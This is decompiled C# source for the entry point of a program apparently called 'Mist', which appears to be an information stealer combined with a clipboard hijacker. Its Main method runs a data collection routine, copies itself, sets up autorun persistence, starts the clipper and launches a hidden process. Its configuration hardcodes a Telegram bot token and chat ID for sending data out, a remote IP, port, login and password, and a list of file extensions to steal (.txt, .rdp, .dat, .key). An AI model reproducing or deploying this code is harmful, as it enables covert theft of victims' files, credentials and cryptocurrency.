using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using Mist.Clipper;
using Mist.Properties;

namespace Mist
{
	// Token: 0x02000007 RID: 7
	internal class Program
	{
		// Token: 0x0600000B RID: 11 RVA: 0x00005D2C File Offset: 0x00003F2C
		[STAThread]
		private static void Main()
		{
			try
			{
				AppDomain.CurrentDomain.AssemblyResolve += Program.<Main>g__AppDomain_AssemblyResolve|8_0;
				if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
				{
					Collection.GetCollection();
				}
			}
			catch
			{
				Clean.GetClean();
			}
			finally
			{
				Clean.GetClean();
				Clipper.CopyFile();
				Clipper.autorun();
				Clipper.start();
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000042E8 File Offset: 0x000024E8
		[CompilerGenerated]
		internal static Assembly <Main>g__AppDomain_AssemblyResolve|8_0(object sender, ResolveEventArgs args)
		{
			if (args.Name.Contains("DotNetZip"))
			{
				return Assembly.Load(Resources.DotNetZip);
			}
			return null;
		}

		// Token: 0x04000006 RID: 6
		public static string Token = "1247336048:AAEWdtjljj_JaOZsJ0lF53BbECI3sEntiVQ";

		// Token: 0x04000007 RID: 7
		public static string ID = "765398224";

		// Token: 0x04000008 RID: 8
		public static string ip = "196.19.243.220";

		// Token: 0x04000009 RID: 9
		public static int port = 8000;

		// Token: 0x0400000A RID: 10
		public static string login = "91F9gD";

		// Token: 0x0400000B RID: 11
		public static string password = "5MUytv";

		// Token: 0x0400000C RID: 12
		public static int sizefile = 50000000;

		// Token: 0x0400000D RID: 13
		public static string[] expansion = new string[]
		{
			".txt",
			".rdp",
			".dat",
			".key"
		};
	}
}
